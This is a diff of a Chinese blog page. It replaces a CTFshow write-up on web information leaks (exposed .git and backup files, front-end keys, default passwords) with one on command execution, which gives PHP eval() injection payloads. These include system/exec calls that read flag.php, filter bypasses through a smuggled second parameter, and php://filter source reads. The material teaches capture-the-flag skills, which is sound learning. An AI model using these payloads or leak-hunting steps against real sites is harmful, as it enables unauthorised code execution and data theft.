@@ -2,16 +2,16 @@
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="CTFSHOW">
-<title>CTF_show Web入门 信息收集writeup</title>
+<title>CTF_show Web 命令执行writeup</title>
 
-<link rel='canonical' href='https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/'>
+<link rel='canonical' href='https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up/'>
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="CTF_show Web入门 信息收集writeup">
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="CTF_show Web 命令执行writeup">
 <meta property='og:description' content="CTFSHOW">
-<meta property='og:url' content='https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/'>
+<meta property='og:url' content='https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up/'>
 <meta property='og:site_name' content='清尘博客 - 静心'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-11-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-11-06T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="CTF_show Web入门 信息收集writeup">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-11-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-11-25T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="CTF_show Web 命令执行writeup">
 <meta name="twitter:description" content="CTFSHOW">
     </head>
     <body class="
@@ -309,26 +309,16 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#web1">WEB1</a></li>
-    <li><a href="#web2">WEB2</a></li>
-    <li><a href="#web3">WEB3</a></li>
-    <li><a href="#web4">WEB4</a></li>
-    <li><a href="#web5">WEB5</a></li>
-    <li><a href="#web6">WEB6</a></li>
-    <li><a href="#web7">WEB7</a></li>
-    <li><a href="#web8">WEB8</a></li>
-    <li><a href="#web9">WEB9</a></li>
-    <li><a href="#web10">WEB10</a></li>
-    <li><a href="#web11">WEB11</a></li>
-    <li><a href="#web12">WEB12</a></li>
-    <li><a href="#web13">WEB13</a></li>
-    <li><a href="#web14">WEB14</a></li>
-    <li><a href="#web15">WEB15</a></li>
-    <li><a href="#web16">WEB16</a></li>
-    <li><a href="#web17">WEB17</a></li>
-    <li><a href="#web18">WEB18</a></li>
-    <li><a href="#web19">WEB19</a></li>
-    <li><a href="#web20">WEB20</a></li>
+    <li><a href="#web29">WEB29</a></li>
+    <li><a href="#web30">WEB30</a></li>
+    <li><a href="#web31">WEB31</a>
+      <ol>
+        <li><a href="#1可以构造一个新函数">1.可以构造一个新函数</a></li>
+        <li><a href="#2可以利用已知的其他函数来凑出所需要的字符串来绕过">2.可以利用已知的其他函数来凑出所需要的字符串来绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#web32">WEB32</a></li>
+    <li><a href="#web33">WEB33</a></li>
   </ol>
 </nav>
         </div>
@@ -363,8 +353,8 @@
                 Web
             </a>
         
-            <a href="/categories/information/" >
-                Information
+            <a href="/categories/commandexec/" >
+                CommandExec
             </a>
         
     </header>
@@ -372,7 +362,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/ctfshow_web_informationcollect_write_up/">CTF_show Web入门 信息收集writeup</a>
+            <a href="/p/ctfshow_web_command_write_up/">CTF_show Web 命令执行writeup</a>
         </h2>
     
         
@@ -398,7 +388,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Nov 06, 2024</time>
+                <time class="article-time--published">Nov 14, 2024</time>
             </div>
         
 
@@ -428,151 +418,66 @@
     <section class="article-content">
     
     
-    <h1 id="ctfshow-web入门-信息收集writeup">CTFSHOW web入门 信息收集WriteUP
-</h1><p><code>2</code> <code>3</code> <code>3</code> <code>C</code> <code>T</code> <code>F</code> <code>S</code> <code>H</code> <code>O</code> <code>W</code></p>
-<p><strong>因为放图后国内网络问题导致加载速度很慢效果不佳所以从这个开始就尽量不放图片了</strong></p>
-<!--
- ________      _________    ________  ________       ___  ___      ________      ___       __      
-|\   ____\    |\___   ___\ |\  _____\|\   ____\     |\  \|\  \    |\   __  \    |\  \     |\  \    
-\ \  \___|    \|___ \  \_| \ \  \__/ \ \  \___|_    \ \  \\\  \   \ \  \|\  \   \ \  \    \ \  \   
- \ \  \            \ \  \   \ \   __\ \ \_____  \    \ \   __  \   \ \  \\\  \   \ \  \  __\ \  \  
-  \ \  \____        \ \  \   \ \  \_|  \|____|\  \    \ \  \ \  \   \ \  \\\  \   \ \  \|\__\_\  \ 
-   \ \_______\       \ \__\   \ \__\     ____\_\  \    \ \__\ \__\   \ \_______\   \ \____________\
-    \|_______|        \|__|    \|__|    |\_________\    \|__|\|__|    \|_______|    \|____________|
-                                        \|_________|                                               
-                                                                                                   
-ctfshow{b10g_K1nGB@t3oFt_t0p}
-
-HAHA YOU WIN
--->
-<h2 id="web1">WEB1
-</h2><p><em><strong>开发注释未及时删除</strong></em></p>
-<p>进入环境直接使用F12打开控制台即可找出<em>flag</em></p>
-<p><code>&lt;!-- ctfshow{4fd63d59-4831-49ff-9bd6-4ee34b8e70c4} --&gt;</code></p>
-<h2 id="web2">WEB2
-</h2><p><em><strong>js前台拦截 === 无效操作</strong></em></p>
-<p>这道题进去以后发现F12按了没反应，右键也不行，但是可以直接通过浏览器界面打开开发者模式或者通过查看源代码绕过，<em>flag</em>就在注释里</p>
-<p><code>&lt;!-- ctfshow{5f025258-4778-4833-95ff-1941f3ae0f6e} --&gt;</code></p>
-<h2 id="web3">WEB3
-</h2><p><em><strong>没思路的时候抓个包看看，可能会有意外收获</strong></em></p>
-<p>根据提示从请求头直接抓取到<em>flag</em></p>
-<p><code>Flag: ctfshow{c9e9eea4-5293-47d2-8f13-219856f7d61e}</code></p>
-<h2 id="web4">WEB4
-</h2><p><em><strong>总有人把后台地址写入robots，帮黑阔大佬们引路。</strong></em></p>
-<p>这道题根据提示直接访问robots.txt，获取到<em>flag</em>文件地址，访问即可得到<em>flag</em></p>
-<h2 id="web5">WEB5
-</h2><p><em><strong>phps源码泄露有时候能帮上忙</strong></em></p>
-<p>这道题一开始没有思路，但是看到phps文件尝试访问index.phps下载到主页的源码后直接在注释里得到<em>flag</em></p>
-<p><code>//ctfshow{2b127e88-8378-410e-abe0-1f215357d8ac}</code></p>
-<h2 id="web6">WEB6
-</h2><p><em><strong>解压源码到当前目录，测试正常，收工</strong></em></p>
-<p>这道题是站长太粗心直接把网站源码遗留在生产环境中，扫描目录发现www.zip，下载即可直接获得<em>flag</em></p>
-<h2 id="web7">WEB7
-</h2><p><em><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></em></p>
-<p>这道题根据提示可以猜到是版本文件泄露，尝试访问/.git直接获取<em>flag</em></p>
-<h2 id="web8">WEB8
-</h2><p><em><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></em></p>
-<p>嗯？难道我看错题了？不过测试发现.git这次不行了，经过搜索发现.svn也是常用的开发版本文件，尝试访问发现直接获取<em>flag</em></p>
+    <h1 id="ctfshow-web-命令执行writeup">CTFSHOW web 命令执行WriteUP
+</h1><h2 id="web29">WEB29
+</h2><p><em><strong>命令执行，需要严格的过滤</strong></em></p>
+<p>这里看到用c传参，做了一点简单过滤 <em><del>不过这点东西怎么能难倒我，哼</del></em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">NOTE</span> 
-</span></span><span class="line"><span class="cl"><span class="n">常见文件泄露目录格式</span>
-</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">git</span>  <span class="o">.</span><span class="n">svn</span>  <span class="o">.</span><span class="n">DS_store</span>  <span class="o">.</span><span class="n">hg</span>  <span class="o">/</span><span class="n">CVS</span><span class="o">/*</span>  <span class="o">.</span><span class="n">bzr</span>   <span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">swp</span>  <span class="n">phpinfo</span><span class="o">.</span><span class="n">php</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">方法1 c=system(&#34;cp fl*g.php 123.txt&#34;); 访问123.txt即可
+</span></span><span class="line"><span class="cl">方法2 c=system(&#34;tac fl*g.php&#34;)
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="web9">WEB9
-</h2><p><em><strong>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</strong></em></p>
-<p>这题似乎也没啥思路，不过上一题查过vim的缓存文件 .filename.swp 尝试访问index.php.swp直接获取到了<em>flag</em></p>
-<h2 id="web10">WEB10
-</h2><p><em><strong>cookie 只是一块饼干，不能存放任何隐私数据</strong></em></p>
-<p>根据提示直接抓包获取cookie内存储的的<em>flag</em></p>
-<h2 id="web11">WEB11
-</h2><p><em><strong>域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</strong></em></p>
-<p>用好几个网站查询都不行，不知道是什么问题，可能域名有问题，访问不了了，不过大概是考nslookup这种域名解析的知识</p>
-<h2 id="web12">WEB12
-</h2><p><em><strong>有时候网站上的公开信息，就是管理员常用密码</strong></em></p>
-<p>网站底下的帮助热线就是密码，直接使用admin账号即可登录</p>
-<h2 id="web13">WEB13
-</h2><p><em><strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></em></p>
-<p>在网站顶部看到document，点进去后看到默认密码，尝试登录直接成功</p>
-<h2 id="web14">WEB14
-</h2><p><em><strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</strong></em></p>
-<p>这道题一开始也没思路，点提示后才发现/editor是个能访问的插入编辑器，选择上传文件发现有个文件浏览，一看直接连传马都不需要了，直接找到<em>flag</em>所在文件打开即可</p>
-<h2 id="web15">WEB15
-</h2><p><em><strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></em></p>
-<p>根据提示找到一个QQ邮箱，尝试/admin发现后台管理界面，尝试邮箱失败，不过发现有重置密码界面，点进去发现是我所在的城市？根据QQ邮箱的QQ直接搜到这个人是在西安，尝试后直接改掉了密码进入后台</p>
-<h2 id="web16">WEB16
-</h2><p><em><strong>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</strong></em></p>
-<p>直接访问tz.php找phpinfo信息，然后直接搜索到作为<em>flag</em>的环境变量</p>
-<h2 id="web17">WEB17
-</h2><p><em><strong>备份的sql文件会泄露敏感信息</strong></em></p>
-<p>直接下载backup.sql获得<em>flag</em></p>
-<h2 id="web18">WEB18
-</h2><p><em><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></em></p>
-<p>这道题是个很难的Flappy bird，玩了一会发现根本不可能过，所以F12找到js文件的通过条件的js</p>
+</div><p>当然这道题方法太多了，不再举例子了</p>
+<h2 id="web30">WEB30
+</h2><p><em><strong>命令执行，需要严格的过滤</strong></em></p>
+<p>这道题看描述和上一道题一样，不过代码过滤相对更加严格了一些</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看出过滤了flag system php这些常用的指令和与flag有关的内容，但是exec，passthru等指令仍然没被过滤</p>
+<p>直接故技重施：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">result</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">confirm</span><span class="p">(</span><span class="s2">&#34;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&#34;</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">c</span><span class="o">=</span><span class="k">echo</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;cp fl*g.ph* 1.txt&#34;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>直接复制到控制台，弹出提示：你赢了，去幺幺零点皮爱吃皮看看</p>
-<p>根据谐音访问110.php直接获取<em>flag</em></p>
-<h2 id="web19">WEB19
-</h2><p><em><strong>密钥什么的，就不要放在前端了</strong></em></p>
-<p>这道题密钥前端验证，可以直接从前端找到判断的js代码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">checkForm</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s2">&#34;0000000372619038&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">iv</span> <span class="o">=</span> <span class="s2">&#34;ilove36dverymuch&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">pazzword</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#pazzword&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">pazzword</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nx">pazzword</span><span class="p">,</span><span class="nx">key</span><span class="p">,</span><span class="nx">iv</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#pazzword&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="nx">pazzword</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#loginForm&#34;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="nx">key</span><span class="p">,</span><span class="nx">iv</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//key,iv：16位的字符串
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">key1</span>  <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Latin1</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">iv1</span>   <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Latin1</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">iv</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">key1</span><span class="p">,{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">iv</span> <span class="o">:</span> <span class="nx">iv1</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">mode</span> <span class="o">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">padding</span> <span class="o">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">ZeroPadding</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}).</span><span class="nx">toString</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>还给了验证的密钥</p>
+</div><p>访问url/1.txt直接得到flag</p>
+<p>附：<a class="link" href="https://www.php.cn/faq/298828.html"  target="_blank" rel="noopener"
+    >php执行系统指令相关芝士</a></p>
+<h2 id="web31">WEB31
+</h2><p><em><strong>命令执行，需要严格的过滤</strong></em>
+这道题仍然烤命令过滤，打开题看一眼先</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -587,25 +492,78 @@ HAHA YOU WIN
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">$flag</span><span class="o">=</span><span class="s2">&#34;fakeflag&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">$u</span> <span class="o">=</span> <span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">$p</span> <span class="o">=</span> <span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;pazzword&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nx">$u</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nx">$p</span><span class="p">)){</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">$u</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">$p</span> <span class="o">===</span><span class="s1">&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">echo</span> <span class="nx">$flag</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>根据收集到的信息搜索AES加密，使用<a class="link" href="[https://]%28https://www.mklab.cn/utils/aes%29" >这个网站</a>，从上面前端的JS中找到相关方法：<code>CBC</code> <code>ZeroPadding</code>，再根据密文解密出密码：<em><strong>i_want_a_36d_girl</strong></em></p>
-<p>直接提交账号和密码<code>admin</code> <code>i_want_a_36d_girl</code>获取<em>flag</em></p>
-<h2 id="web20">WEB20
-</h2><p><em><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</strong></em></p>
-<p>根据提示搜索相关信息，可以搜到/db/db.mdb，尝试下载后使用access打开，虽然报了一堆错，但是最后还是找到了<em>flag</em></p>
-<p><code>flag{ctfshow_old_database}</code></p>
-
+</div><p>好家伙，这次过滤了这么多，甚至连空格都给过滤了，怎么办呢，这里偷看了wp，大概有三种方法：</p>
+<h3 id="1可以构造一个新函数">1.可以构造一个新函数
+</h3><p>例<code>c=eval($_GET[a]);&amp;a=system('cat flag.php');</code>因为只判断了传入的c的值，直接新建一个变量直接绕过，这种方法也适用于上面两种</p>
+<h3 id="2可以利用已知的其他函数来凑出所需要的字符串来绕过">2.可以利用已知的其他函数来凑出所需要的字符串来绕过
+</h3><p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>
+名词解释：</p>
+<p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&quot;.&quot;</p>
+<p>pos():输出数组第一个元素，不改变指针；</p>
+<p>scandir();遍历目录，这里因为参数为&quot;.&ldquo;所以遍历当前目录</p>
+<p>array_reverse():元组倒置</p>
+<p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p>
+<p>show_source():查看源码</p>
+<h2 id="web32">WEB32
+</h2><p><em><strong>命令执行，需要严格的过滤</strong></em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过滤了大部分需要用到的东西，命令执行现在基本上不可能了，于是可以通过特殊方法绕过</p>
+<p>以下是传参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">c</span><span class="o">=</span><span class="k">include</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?%</span><span class="mi">3</span><span class="nx">E</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是什么意思呢？这里的<code>%0a</code>和<code>%3E</code>分别代表回车和&gt;，可以从题目中发现题目中php源文件的尖括号并不是闭合的，以下是参考解析</p>
+<p>在c参数中，我们看到以下内容：</p>
+<p>include：这是一个PHP函数，用来包含并执行指定文件的内容。在正常情况下，它可以用来加载并执行PHP文件。</p>
+<p>%0a（换行符）：通过插入换行符，它可能会帮助跳过过滤条件，或者对PHP语法产生意外的影响。</p>
+<p>$_GET[1]：这是通过GET请求获取名为1的参数的值。PHP的$_GET超全局数组可以用来获取URL中的查询参数。</p>
+<p>?%3E（&gt;）：表示HTML标签的结束符。这个符号的作用可能是结束之前的PHP代码并防止它继续执行。</p>
+<p>总结一下，这部分的含义是：通过include包含一个动态路径文件，并在路径中利用$_GET[1]来进一步控制要执行的文件。</p>
+<p>接下来使用<code>1=php://filter/convert.base64-encode/resource=flag.php</code>进行文件读取，将读取出的base64编码文件转为php文件即可。</p>
+<h2 id="web33">WEB33
+</h2>
 </section>
 
 
@@ -624,7 +582,19 @@ HAHA YOU WIN
 
         <span>Licensed under CC BY-NC-SA 4.0</span>
     </section>
-    </footer>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Nov 25, 2024 00:00 UTC
+        </span>
+    </section></footer>
 
 
     
@@ -660,6 +630,19 @@ HAHA YOU WIN
 
         <div class="article-details">
             <h2 class="article-title">CTF_show Web 爆破writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ctfshow_web_informationcollect_write_up/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CTF_show Web入门 信息收集writeup</h2>
         </div>
     </a>
 </article>
